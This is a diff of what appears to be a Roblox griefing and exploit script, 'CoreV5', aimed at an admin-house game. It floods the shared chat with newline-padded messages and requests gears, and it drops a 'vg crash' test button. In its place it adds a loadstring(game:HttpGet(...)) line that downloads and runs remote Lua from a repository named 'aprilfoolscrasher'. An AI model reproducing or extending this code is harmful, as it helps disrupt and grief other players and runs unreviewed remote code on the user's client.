@@ -45,7 +45,7 @@ Rayfield:Notify({-- notfi for the script
 local Button = Tab:CreateButton({
    Name = "gui credit",
    Callback = function()
-   game.Players:Chat("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n CoreV5 made by inyuhbhutt (beta testers only 🔒) so no you cant get the script .ioKAHCoreV4 \n \n \n \n \n")
+   game.Players:Chat("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n CoreV5 made by inyuhbhutt (invite only🔒) so no you cant get the script .ioKAHCoreV4 \n \n \n \n \n")
 end,
 })
 
@@ -193,7 +193,7 @@ local Button = Tab:CreateButton({
 
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-13.0838919, 8.6299963, 94.3988953, -0.992040515, 7.79336276e-08, 0.125919163, 7.45381001e-08, 1, -3.1677537e-08, -0.125919163, -2.20396235e-08, -0.992040515)
 wait(0.01)
-game.Players:Chat("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n Core V5(beta) got executed 😎 (invite only🔒)io.KAHCoreV4 \n \n \n \n \n")
+game.Players:Chat("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n Core V5 got executed 😎 (invite only🔒)io.KAHCoreV4 \n \n \n \n \n")
 wait(0.1)
 Rayfield:Notify({
    Title = "CoreV5",
@@ -226,14 +226,11 @@ print("AyItsDamixer (a friend and helper for the h in the middel of the screen)"
 print("xq12(a friend and idea giver)")
 print("cofead(the welcome message)")
 print("sirus ui lib maker")
-
-local Button = Tab:CreateButton({
-   Name = "test vgcrash",
-   Callback = function()
-      game.Players:Chat("gear me 94794847")
-      local function say(real)
-         game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(real,"All")
-     end
-     say("[Core V5] tested vg crash")    
-   end,
-})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aprilfoolscrasher/antiabuse/main/antiabuse"))();
+game.Players:Chat("gear me 16200402") -- remember "1nob" code F3X important
+wait(0.1)
+game.Players:Chat("gear me 16200204")
+wait(0.1)
+game.Players:Chat("gear me 16200508")
+wait(0.1)
+game.Players:Chat("gear me 16200420")
